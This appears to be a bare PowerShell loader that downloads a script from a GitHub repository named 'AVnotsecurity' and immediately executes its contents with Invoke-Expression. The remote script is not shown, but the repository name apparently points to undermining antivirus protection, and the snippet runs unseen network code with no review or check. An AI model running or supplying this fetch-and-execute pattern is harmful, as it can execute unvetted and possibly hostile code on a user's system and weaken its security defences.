$ScriptFromGithHub = Invoke-WebRequest "https://raw.githubusercontent.com/bryanster/AVnotsecurity/main/1.ps1"
Invoke-Expression $($ScriptFromGithHub.Content)